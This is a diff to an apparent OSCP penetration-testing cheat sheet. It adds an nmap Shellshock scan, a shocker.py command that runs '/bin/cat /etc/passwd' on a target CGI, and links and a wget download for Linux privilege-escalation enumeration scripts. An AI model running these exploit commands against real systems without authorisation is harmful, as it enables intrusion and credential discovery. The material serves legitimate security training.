@@ -1066,9 +1066,13 @@ Shells
 
 -   Shellshock
 
+    -   Testing for shell shock with NMap
+    
+    `root@kali:~/Documents# nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip`
+
     -   git clone <https://github.com/nccgroup/shocker>
 
-    -   `./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose`
+    `./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose`
 
     -   Shell Shock SSH Forced Command  
         Check for forced command by enabling all debug output with ssh  
@@ -1267,19 +1271,30 @@ Privilege Escalation
     
 -   There are a few scripts that can automate the linux enumeration process:
 
+      - Google is my favorite Linux Kernel exploitation search tool.  Many of these automated checkers are missing important kernel exploits which can create a very frustrating blindspot during your OSCP course.
+
+      - LinuxPrivChecker.py - My favorite automated linux priv enumeration checker - 
+      
+         [https://www.securitysift.com/download/linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py)
+
       - LinEnum - (Recently Updated)
+      
       [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
       
       - linux-exploit-suggester (Recently Updated)
+      
       [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
       
       -   Highon.coffee Linux Local Enum - Great enumeration script!
+      
           `wget https://highon.coffee/downloads/linux-local-enum.sh`
 
       -   Linux Privilege Exploit Suggester  (Old has not been updated in years)
+      
     [https://github.com/PenturaLabs/Linux\_Exploit\_Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester)
 
       -   Linux post exploitation enumeration and exploit checking tools  
+      
     [https://github.com/reider-roque/linpostexp](https://github.com/reider-roque/linpostexp)
     
 
